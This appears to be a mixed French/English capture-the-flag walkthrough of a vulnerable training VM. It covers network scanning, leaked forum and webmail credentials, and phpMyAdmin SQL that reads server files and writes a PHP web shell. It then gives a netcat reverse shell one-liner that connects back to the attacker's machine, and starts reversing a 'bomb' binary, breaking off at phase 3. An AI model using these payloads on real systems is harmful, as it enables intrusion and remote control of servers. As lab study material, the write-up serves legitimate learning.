installer kalilinux
sudo apt-get install gobuster

scanner le réseau avec nmap
cmd : nmap -sP 192.168.0-255.0/24

get the ip of the virtual machine

nmap the ip of the machine (there are on ports) port 80 et 443 open -> web server
cmd : nmap --top-ports 1000 -T4 -sC http://example.com
	OR
open armitage and scan within the range of the virtual machine

Go to the ip of the virtual machine on internet or curl it. There is a page.

nikto -h + adress ou dirb sur l'ip de la machine en http et https
cmd: nikto -h https://ip_machine
OR
cmd: dirb https://ip_machine

phpmyadmin + forum + mail

User login try !q\]Ej?*5K5cy*AJ in forum 6
(maybe password misstype?)
And right after that lmezard logged in, maybe it was a mistake from his part ..

user: lmezard
pwd: !q\]Ej?*5K5cy*AJ

Try to send mail to admin when you're logged in
your mail is : laurie@borntosec.net

We still have the webmail we didn't use, we try to logged on it with the mail adress and
the same pwd we still have.
Connecting to mail at webmail works.

In the mail we have the logged for phpmyadmin.
Connecting to db via the mail from the admin
user: root
pwd: Fg-'kKXBj87E:aJ$

If we go here ip_machine/icons/README, we see that the server is running on apache, by default the directory is /var/www

We need this command
INSERT INTO `mlf2_entries_cache`(`cache_id`, `cache_text`) VALUES (12,LOAD_FILE("/var/www/forum/index.php"))

We have the right to write in compile dir

If we look at the code we have directory, we can try to put in some file with that mysql command

select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/test.php"

the good dir is /var/www/forum/templates_c/test.php (who is the compile dir in index.php)

reverse shell on that website without -e
https://www.nicolashug.com/pentest-et-securite/netcat-reverse-shell-e
launch on kali : nc -nvlp 1234
cmd in the php exploit : mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc MY_IP 1234 1>/tmp/backpipe

directory /home/LOOKATME
cd /home/LOOKATME; cat password
there is something on the password
user: lmezard
pwd: G!@M6f4Eatau{sF"

got a file called fun
need to parse it
I try to send it into a html in the dir i have the right and parse it.. But i was wrong
The file is actually a .tar
So i open a ssh port on the kali machine and connect it via lmezard account to copy it with scp and then untar it (tar -xzf fun)
We have the position of each file with //fileXX
I unrar it but there is still parsing to do. I have to get a "\n" at the end of each to escape the //file of the previous file so that the next line isn't escape. It works !
I have a message who tell me to ssh a pass.. let's do it

The result is used to login with user laurie in ssh
user: laurie
pwd: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

We see the bomb with a file readme
Bomb is compiled, we use hexray (ida64)

PHASE_1

We see that the first_phase is a strcmp with "Public speaking is very easy."
We type it -> victory
We can see the adress with gdb if we disas phase_1 and p/s (for the character) and the adress of the register


PHASE_2

we need to disas phase_2,
got this line :
	0x08048b56 <+14>:	lea    -0x18(%ebp),%eax
   	0x08048b59 <+17>:	push   %eax
   	0x08048b5a <+18>:	push   %edx
	0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers>
	- So we push the adress of %ebp in read_six_numbers

	0x08048b63 <+27>:	cmpl   $0x1,-0x18(%ebp)
  	0x08048b67 <+31>:	je     0x8048b6e <phase_2+38>
 	0x08048b69 <+33>:	call   0x80494fc <explode_bomb>
 	- Here if the first number of ebp isn't 1 we don't jump and we explode


After that we launch gdb (yeah), and we disas phase_2 and put a breakpoint just before the cmp which is just before the explosion
and we look at eax register each time with "info r"
break *0x08048b7e

We got 1 2 6 24 120 720

PHASE_3

REGISTRE A LA CON : eax<=2 && ebp>7
